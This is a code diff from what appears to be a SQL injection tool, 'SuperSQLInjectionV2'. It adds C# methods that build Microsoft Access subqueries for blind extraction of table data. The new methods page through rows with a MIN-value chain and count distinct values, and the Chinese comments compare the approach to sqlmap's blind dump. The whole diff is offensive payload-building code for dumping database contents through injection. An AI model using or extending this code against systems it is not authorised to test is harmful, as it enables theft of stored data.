@@ -193,6 +193,40 @@ namespace SuperSQLInjectionV2.Payload
                 ("rowIndex", dp.DataIndex + opt.DataIndexOffset), ("where", BasePayloadTool.WhereSql(dp.Where, false)));
         }
 
+        public bool MinValueChainPaging => opt.MinValueChain;
+
+        /// <summary>
+        /// MIN 值链取数（Access）：(select min(col) from t [where 用户条件] [and cvar(col)>'last'])。
+        /// cvar 转 Variant 后比较，数字/字符串列通用（sqlmap dump_table.blind 同款语义）；
+        /// lastValue 单引号转义防闭合
+        /// </summary>
+        public string DataValueChain(DumpDataParam dp, string? lastValue)
+        {
+            string data = string.Join(",", dp.Columns);
+            var conds = new List<string>();
+            string w = (dp.Where ?? "").Trim();
+            if (w.StartsWith("where ", StringComparison.OrdinalIgnoreCase)) w = w.Substring(6).Trim();
+            if (w.StartsWith("and ", StringComparison.OrdinalIgnoreCase)) w = w.Substring(4).Trim();
+            if (w.Length > 0)
+            {
+                conds.Add("(" + w + ")");
+            }
+            if (lastValue != null)
+            {
+                conds.Add("cvar(" + data + ")>'" + lastValue.Replace("'", "''") + "'");
+            }
+            string where = conds.Count > 0 ? " where " + string.Join(" and ", conds) : "";
+            return "(select min(" + data + ") from " + dp.TableName + where + ")";
+        }
+
+        /// <summary>distinct 计数（MIN 值链行数口径）：(select count(*) from (select distinct col from t [where]))</summary>
+        public string DataCountDistinct(DumpDataParam dp)
+        {
+            string data = string.Join(",", dp.Columns);
+            string where = BasePayloadTool.WhereSql(dp.Where, false);
+            return "(select count(*) from (select distinct " + data + " from " + dp.TableName + where + "))";
+        }
+
         public string UnionData(DumpDataParam dp)
         {
             List<string> newColumns = BasePayloadTool.ConcatColumns(dp.Columns, bp.IFNull, dp.NoCast ? "" : bp.Cast);
